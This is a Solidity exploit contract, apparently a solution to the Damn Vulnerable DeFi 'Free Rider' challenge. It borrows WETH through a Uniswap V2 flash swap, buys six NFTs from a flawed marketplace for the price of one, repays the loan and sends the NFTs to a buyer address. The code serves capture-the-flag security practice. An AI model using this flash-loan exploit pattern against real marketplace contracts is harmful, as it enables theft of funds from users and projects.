// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";

interface IWETH{
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

interface IMarketplace{
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract RiderAttack is IERC721Receiver{

    IUniswapV2Factory factory;
    IUniswapV2Pair uniPair;
    DamnValuableNFT dvNFT;
    IWETH weth;
    IMarketplace marketplace;
    address buyer;

    constructor(
        IUniswapV2Factory _factory,
        IUniswapV2Pair _uniPair,
        DamnValuableNFT _dvNFT,
        IWETH _weth,
        IMarketplace _marketplace,
        address _buyer
    ) {
        factory = _factory;
        uniPair = _uniPair;
        dvNFT = _dvNFT;
        weth = _weth;
        marketplace = _marketplace;
        buyer = _buyer;
    } 

    function attack(uint256 _amount) external {
        uniPair.swap(_amount, 0, address(this), "give me some money");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        // rest of the function goes here!

        //unwrap weth into eth 
        weth.withdraw(amount0);

        //create an array for the tokenIds
        uint256[] memory NFTs = new uint256[](6);
        for (uint256 i; i < 6; ++i){
            NFTs[i] = i;
        }

        //buy many NFTs
        marketplace.buyMany{value: 15 ether}(NFTs);

        //calculate the fees to repay
        uint256 fees = (amount0 * 100301) / 100000; 

        //rewrap the eth into weth
        weth.deposit{value: fees}(); 

        //repay the flashswap plus fees
        weth.transfer(msg.sender, fees);

        //transfer tokens to buyer
        for (uint256 i; i < 6; ++i){
            dvNFT.safeTransferFrom(address(this), buyer, NFTs[i]);
        }

    }

        function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {   
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable{}
}